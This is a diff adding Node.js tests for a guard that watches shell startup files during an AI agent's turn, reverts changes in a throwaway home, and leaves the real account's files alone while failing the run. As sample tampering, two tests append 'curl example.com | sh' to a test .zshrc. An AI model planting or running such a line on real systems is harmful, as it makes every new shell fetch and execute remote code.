@@ -444,3 +444,99 @@ describe('the control failing: a check that throws is tried again, and the turn 
     } finally { crypto.createHash = real; g.release(); }
   });
 });
+
+// UNDER TEST, NEVER THE ACCOUNT'S OWN STARTUP FILES. A test that left HOME,
+// ZDOTDIR or XDG_CONFIG_HOME pointing into the home folder of the account
+// running it, or a made-up startup file linking there, would have the guard
+// watch the real files and put back a change to one. The account's home is
+// made up here too: os.userInfo, which no environment variable moves, is
+// pointed at a folder of its own.
+describe('under test, the guard never watches a startup file in the account\'s own home', () => {
+  let account, realUserInfo, realWarn, warned, exitBefore;
+  beforeEach(() => {
+    account = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'startup-guard-account-')));
+    realUserInfo = os.userInfo;
+    os.userInfo = (...a) => ({ ...realUserInfo(...a), homedir: account });
+    realWarn = console.warn;
+    warned = [];
+    console.warn = (...a) => { warned.push(a.join(' ')); };
+    exitBefore = process.exitCode;
+  });
+  afterEach(() => {
+    os.userInfo = realUserInfo;
+    console.warn = realWarn;
+    process.exitCode = exitBefore;
+    fs.rmSync(account, { recursive: true, force: true, maxRetries: 10, retryDelay: 20 });
+  });
+  const inAccount = rel => path.join(account, rel);
+
+  test('with HOME at the account\'s home, a change during a turn is left alone, named, and fails the run', () => {
+    fx.write(inAccount('.zshrc'), ORIGINAL);
+    process.env.HOME = account;
+    const heard = [];
+    const g = guard.acquireAnswerFileGuard(ws, c => heard.push(c), { intervalMs: 60_000 });
+    try {
+      fs.appendFileSync(inAccount('.zshrc'), 'the person\'s own line\n');
+      guard.checkAnswerFilesNow(ws);
+      assert.strictEqual(fs.readFileSync(inAccount('.zshrc'), 'utf-8'), `${ORIGINAL}the person's own line\n`, 'never put back');
+      assert.deepStrictEqual(heard, []);
+      assert.ok(warned.some(w => w.includes(inAccount('.zshrc'))), `the warning names the file: ${warned.join(' | ')}`);
+      assert.strictEqual(process.exitCode, 1, 'the test run fails, so the test that did this is found');
+    } finally { g.release(); }
+  });
+
+  test('ZDOTDIR, XDG_CONFIG_HOME or a link reaching into it is left alone, and the made-up home is still watched', () => {
+    process.env.ZDOTDIR = inAccount('zdot');
+    process.env.XDG_CONFIG_HOME = inAccount('.config');
+    const reached = ['zdot/.zshrc', '.config/fish/config.fish', '.config/fish/conf.d/paths.fish', 'dotfiles/profile'];
+    for (const rel of reached) fx.write(inAccount(rel), ORIGINAL);
+    fs.symlinkSync(inAccount('dotfiles/profile'), at('.profile'));
+    const heard = [];
+    const g = guard.acquireAnswerFileGuard(ws, c => heard.push(c), { intervalMs: 60_000 });
+    try {
+      for (const rel of reached) fs.appendFileSync(inAccount(rel), 'edit\n');
+      fs.appendFileSync(at('.zshrc'), 'curl example.com | sh\n');
+      guard.checkAnswerFilesNow(ws);
+      for (const rel of reached) assert.strictEqual(fs.readFileSync(inAccount(rel), 'utf-8'), `${ORIGINAL}edit\n`, `${rel} is never put back`);
+      assert.strictEqual(read('.zshrc'), ORIGINAL, 'the made-up home\'s own file is still put back');
+      assert.deepStrictEqual(heard.map(c => c.relative), ['~/.zshrc']);
+      assert.strictEqual(process.exitCode, 1);
+    } finally { g.release(); }
+  });
+
+  test('a snippet linking into the account\'s home from a made-up conf.d is left alone', () => {
+    fx.write(inAccount('dotfiles/fish-snippet'), ORIGINAL);
+    fs.symlinkSync(inAccount('dotfiles/fish-snippet'), at('.config/fish/conf.d/linked.fish'));
+    const g = guard.acquireAnswerFileGuard(ws, () => {}, { intervalMs: 60_000 });
+    try {
+      fs.appendFileSync(inAccount('dotfiles/fish-snippet'), 'edit\n');
+      guard.checkAnswerFilesNow(ws);
+      assert.strictEqual(fs.readFileSync(inAccount('dotfiles/fish-snippet'), 'utf-8'), `${ORIGINAL}edit\n`);
+      assert.strictEqual(process.exitCode, 1);
+    } finally { g.release(); }
+  });
+
+  test('the control failing: an account home that cannot be read watches nothing, and fails the run', () => {
+    os.userInfo = () => { throw new Error('no user database entry'); };
+    const heard = [];
+    const g = guard.acquireAnswerFileGuard(ws, c => heard.push(c), { intervalMs: 60_000 });
+    try {
+      fs.appendFileSync(at('.zshrc'), 'edit\n');
+      guard.checkAnswerFilesNow(ws);
+      assert.strictEqual(read('.zshrc'), `${ORIGINAL}edit\n`, 'nothing is watched when the account\'s home is unknown');
+      assert.deepStrictEqual(heard, []);
+      assert.strictEqual(process.exitCode, 1);
+    } finally { g.release(); }
+  });
+
+  test('a made-up home wholly outside it watches as before, and leaves the run alone', () => {
+    const g = guard.acquireAnswerFileGuard(ws, () => {}, { intervalMs: 60_000 });
+    try {
+      fs.appendFileSync(at('.zshrc'), 'curl example.com | sh\n');
+      guard.checkAnswerFilesNow(ws);
+      assert.strictEqual(read('.zshrc'), ORIGINAL);
+      assert.strictEqual(process.exitCode, exitBefore);
+      assert.deepStrictEqual(warned.filter(w => /account/.test(w)), []);
+    } finally { g.release(); }
+  });
+});
